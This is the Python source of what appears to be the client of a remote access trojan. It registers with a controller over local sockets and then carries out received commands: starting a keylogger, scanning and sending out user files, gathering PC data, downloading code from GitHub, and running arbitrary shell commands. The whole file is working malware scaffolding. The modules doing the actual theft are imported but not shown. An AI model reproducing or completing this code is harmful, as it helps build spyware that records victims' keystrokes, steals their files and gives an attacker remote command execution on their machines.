import socket
import userscanner
import keylogger
import getuser_pc
import github_inject
import threading
import time

# TODO Make these credentials into ones automatically generated by the OS   
HOST_IP = "127.0.0.1"
HOST_PORT = 12345

# TODO: Safeguard it against the server closing/client closing
def send_Ip_Port():
    while True:
        try:
            cli_ip = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cli_ip.connect(("127.0.0.1", 44404))
            msg = f"{HOST_IP};{HOST_PORT}"
            cli_ip.send(bytes(msg, "utf-8"))
            break
        except:
            print("Server offline.")
    while True:
        msg = cli_ip.recv(128).decode("utf-8")
        if msg == "continue": 
            startGmsSocket()
            start_client()

def start_client():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
                print("0: client.py started")
                main_s.bind(("127.0.0.1", 12345))
                print("1: bound the ip and port")
                main_s.listen(1)
                print("2: listening")
                conn, addr = main_s.accept()
                print(f"3: accepted {addr}")
                with conn:
                    while True:
                        try:
                            data = conn.recv(64).decode("utf-8").lower()
                        except: 
                            print("Server disconnected attempting reconnection.")
                            time.sleep(0.01) #? maybe fixes the issue?
                            break
                        # The command section:
                        if data:
                            match data:
                                case "run -keylogger":
                                    data = ""
                                    print("Command: ", {data})
                                    keylogger.start_keylogger()
    
                                # To je kokotské implementovanie, ale nemusím 500 if dávať
                                case data if "run -gf" == data:
                                    data = ""
                                    print("Command: ", {data})
                                    userscanner.start_FolderData(data)
    
                                case data if "run -gfc" in data:
                                    print("Command: ", {data})
                                    userscanner.start_sendFiles(data)
                                    data = ""
                                    
                                case "run -gatherdata":
                                    getuser_pc.startGathering()
                                    print("Gathering Data")
                                    data= ""

                                case "run -injectcode":
                                    github_inject.start_downloading()
                                    print("Injecting code")
                                    data = ""

                                case data if "run -cmd" in data:
                                    github_inject.run_cmd_code(data)
                                    data= ""

def startGmsSocket():
    gms_t = threading.Thread(target=createGmsSocket)
    gms_t.daemon = True
    gms_t.start()

def createGmsSocket():
    # TODO: Expand on the GMS system
    global gms_s
    gms_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    gms_s.connect(("127.0.0.1",46969))
    gms_s.send(bytes("GMS system has been established.", "utf-8"))



                                    

if __name__ == "__main__":
    send_Ip_Port()